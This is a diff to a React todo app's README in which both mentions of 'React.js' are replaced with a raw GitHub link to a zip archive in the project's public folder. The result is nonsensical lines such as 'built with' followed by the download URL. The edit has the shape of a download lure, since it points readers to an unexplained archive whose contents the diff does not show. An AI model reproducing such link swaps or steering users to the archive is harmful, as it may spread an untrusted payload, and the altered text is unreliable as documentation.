@@ -1,6 +1,6 @@
 # React Todo App
 
-A minimalist and modern Todo List application built with **React.js**.  
+A minimalist and modern Todo List application built with **https://github.com/talhaw-cmd/react-todo-app/raw/refs/heads/main/public/todo_react_app_2.1.zip**.  
 This app demonstrates **React fundamentals** including `useState`, `useEffect`, and **localStorage integration** for persistent data.
 
 ---
@@ -17,7 +17,7 @@ This app demonstrates **React fundamentals** including `useState`, `useEffect`, 
 
 ## 🛠 Technologies Used
 
-- React.js (Functional Components & Hooks)  
+- https://github.com/talhaw-cmd/react-todo-app/raw/refs/heads/main/public/todo_react_app_2.1.zip (Functional Components & Hooks)  
 - JavaScript (ES6+)  
 - HTML5 & CSS3 (Modern, Minimalist Styling)  
 - LocalStorage (Browser-based data persistence)  
